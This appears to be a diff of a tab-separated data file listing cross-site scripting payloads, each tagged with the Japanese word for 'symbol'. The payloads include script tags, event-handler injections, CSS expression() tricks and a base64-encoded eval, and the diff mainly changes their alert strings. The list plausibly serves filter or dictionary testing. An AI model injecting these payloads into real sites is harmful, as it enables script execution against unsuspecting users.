@@ -1,25 +1,25 @@
-x1	<script>alert('xss')</script>	記号	
-x1	<s c r i p t>alert('xss')</s c r i p t>	記号	
-x1	<img src=x onerror=alert('xss')>	記号	
-x1	<svg onload=alert('xss')>	記号	
+x1	<script>alert('XSS')</script>	記号	
+x1	<s c r i p t>alert('XSS')</s c r i p t>	記号	
+x1	<img src=x onerror=alert('XSS')>	記号	
+x1	<svg onload=alert('XSS')>	記号	
 x1	<a onmouseover=javascript:alert(1)>zzz</a>	記号	
-x1	'><body/onhashchange=alert('xss')><a href=#>click</a>	記号	
-x1	x" onmouseover="alert(document.domain);	記号	
-x1	javascript:alert(document.domain);	記号	
+x1	'><body/onhashchange=alert('XSS')><a href=#>click</a>	記号	
+x1	x" onmouseover="alert('XSS');	記号	
+x1	javascript:alert('XSS');	記号	
 x2	<img language=vbs src=<b onerror=alert#1/1#>	記号	
 x2	<body language=vbs onload=alert-1	記号	
 x2	<script language=vbs>msgbox+1</script/comeone>	記号	
 x2	<script>//@cc_on alert@cc_on/* */(1)</script>	記号	
 x2	<body/onload="@set @evil=1; @if(@evil)eval(alert(@evil))@end;">	記号	
-x2	<div style="left:expression( alert('xss'))">	記号	CSSXSS
-x2	<div style="left:exp/* */ression( alert('xss'))">	記号	CSSXSS
-x2	<div style="left:&#x0065;xpression( alert('xss'))">	記号	CSSXSS
-x2	<div style="left:\0065\0078pression( alert('xss'))">	記号	CSSXSS
+x2	<div style="left:expression( alert('XSS'))">	記号	CSSXSS
+x2	<div style="left:exp/* */ression( alert('XSS'))">	記号	CSSXSS
+x2	<div style="left:&#x0065;xpression( alert('XSS'))">	記号	CSSXSS
+x2	<div style="left:\0065\0078pression( alert('XSS'))">	記号	CSSXSS
 x2	<div/style="width:expression(confirm(1))">X</div>	記号	CSSXSS
 x2	<li style="color:rgb(''0,0,&amp;#0;javascript:expression(confirm(1))">XSS</li>	記号	CSSXSS
 x2	<iframe src="#" style=width:exp/**/ressi/**/on(confirm(1))>	記号	CSSXSS
 x2	<input/type=hidden style=&#96;x:expression(alert(/XSS/))&#96;>	記号	CSSXSS
 x2	<div style="color:rgb(''&#amp;0;x:expression(alert(1))"></div>	記号	CSSXSS
-x3	<q/oncut=alert('xss')	記号	
-x3	<q/oncopy=alert('xss')	記号	
+x3	<q/oncut=alert('XSS')	記号	
+x3	<q/oncopy=alert('XSS')	記号	
 x3	<script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='));</script>	記号	
